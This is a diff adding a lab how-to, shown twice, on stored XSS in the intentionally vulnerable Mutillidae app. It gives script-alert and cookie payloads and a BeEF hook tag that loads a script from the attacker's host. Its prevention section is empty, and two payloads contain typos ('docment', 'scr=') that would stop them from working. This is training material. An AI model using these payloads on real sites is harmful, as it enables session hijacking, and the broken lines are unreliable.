@@ -1,0 +1,103 @@
+Persistent XSS injection
+
+A Persistent XSS attack is possible when a website or web application stores user input and later serves it to other users. 
+An application is vulnerable if it does not validate user input before storing content and embedding it into HTML response 
+pages. Attackers use vulnerable web pages to inject malicious code and have it stored on the web server for later use. The 
+payload is automatically served to users who browse web pages and executed in their context. Thus, the victims do not need 
+to click on a malicious link to run the payload (as in the case of Non-Persistent XSS). All they have to do is visit a 
+vulnerable web page.
+
+Persistent Cross-site Scripting (Stored XSS) attacks represent one of three major types of Cross-site Scripting. The other 
+two types of attacks of this kind are Non-Persistent XSS (Reflected XSS) and DOM-based XSS. In general, XSS attacks are 
+based on the victim’s trust in a legitimate but vulnerable web application or website.
+
+-> Open the vulnerable Mutillidae site
+Mutillidae should be installed in the Win10 machine.
+On Kali, open http://<Win10 IP>/mutillidae.
+Put Security level at 0 (Hosed).
+
+-> Try an intrusion
+1. Choose on the left OWASP Top 10 / A1 - Injection / SQLi Bypass Authentication / Login   
+   Connect yourself as admin/adminpass.
+   Choose on the left OWASP 2017 / A7 - Cross Site Scripting (XSS) / Persistent (Second Order) / Add to your blog
+    
+2. Try the service
+  Put [ <b>Gras</b> ] in the dialog box then click on "Save Blog Entry".
+  >>> The entry is correctly entered.
+
+3. Try alert()
+  Put [ <script>alert("xss");</script> ] in the dialog box then "Save Blog Entry".
+  >>> the code is now persistent into the page.
+
+  Click "View Blog", choose "admin" then click on "View Blog Entries".
+  >> The alert box should appear.
+
+4. Try another command
+  Put [ <script>alert(docment.cookie);</script> ] in the dialog box then "Save Blog Entry".
+  >>> you shoud see cookies information.
+
+-> Use BeEF
+Add  <script scr="http://<kali IP>:3000/hook.js"></script> into the dialog box.
+You are now hooked by Beef.
+
+
+-> How to prevent
+Here are some advice:
+  -Nothing for now
+
+>@
+>@##################################################################################################################################
+>@#                                                                                                                                #
+>@# [ Persistent XSS injection ]                                                                                                   #
+>@#                                                                                                                                #
+>@# A Persistent XSS attack is possible when a website or web application stores user input and later serves it to other users.    #
+>@# An application is vulnerable if it does not validate user input before storing content and embedding it into HTML response     #
+>@# pages. Attackers use vulnerable web pages to inject malicious code and have it stored on the web server for later use. The     #
+>@# payload is automatically served to users who browse web pages and executed in their context. Thus, the victims do not need     #
+>@# to click on a malicious link to run the payload (as in the case of Non-Persistent XSS). All they have to do is visit a         #
+>@# vulnerable web page.                                                                                                           #
+>@#                                                                                                                                #
+>@# Persistent Cross-site Scripting (Stored XSS) attacks represent one of three major types of Cross-site Scripting. The other     #
+>@# two types of attacks of this kind are Non-Persistent XSS (Reflected XSS) and DOM-based XSS. In general, XSS attacks are        #
+>@# based on the victim’s trust in a legitimate but vulnerable web application or website.                                         #
+>@#                                                                                                                                #
+>@# See: howto-1075-owasp-top-10.txt                                                                                               #
+>@# See: howto-1076-owasp-top-10-fr.tx                                                                                             #
+>@# See: howto-1092-cross-site-scripting-reflected-xss.txt                                                                         #
+>@#                                                                                                                                #
+>@#--------------------------------------------------------------------------------------------------------------------------------#
+>@
+>@-> Open the vulnerable Mutillidae site
+>@Mutillidae should be installed in the Win10 machine.
+>@On Kali, open http://<Win10 IP>/mutillidae.
+>@Put Security level at 0 (Hosed).
+>@
+>@-> Try an intrusion
+>@1. Choose on the left OWASP Top 10 / A1 - Injection / SQLi Bypass Authentication / Login   
+>@   Connect yourself as admin/adminpass.
+>@   Choose on the left OWASP 2017 / A7 - Cross Site Scripting (XSS) / Persistent (Second Order) / Add to your blog
+>@    
+>@2. Try the service
+>@  Put [ <b>Gras</b> ] in the dialog box then click on "Save Blog Entry".
+>@  >>> The entry is correctly entered.
+>@
+>@3. Try alert()
+>@  Put [ <script>alert("xss");</script> ] in the dialog box then "Save Blog Entry".
+>@  >>> the code is now persistent into the page.
+>@
+>@  Click "View Blog", choose "admin" then click on "View Blog Entries".
+>@  >> The alert box should appear.
+>@
+>@4. Try another command
+>@  Put [ <script>alert(docment.cookie);</script> ] in the dialog box then "Save Blog Entry".
+>@  >>> you shoud see cookies information.
+>@
+>@-> Use BeEF
+>@Add  <script scr="http://<kali IP>:3000/hook.js"></script> into the dialog box.
+>@You are now hooked by Beef.
+>@
+>@-> How to prevent
+>@Nothing for now (in progress).
+>@
+>@##################################################################################################################################
+>@
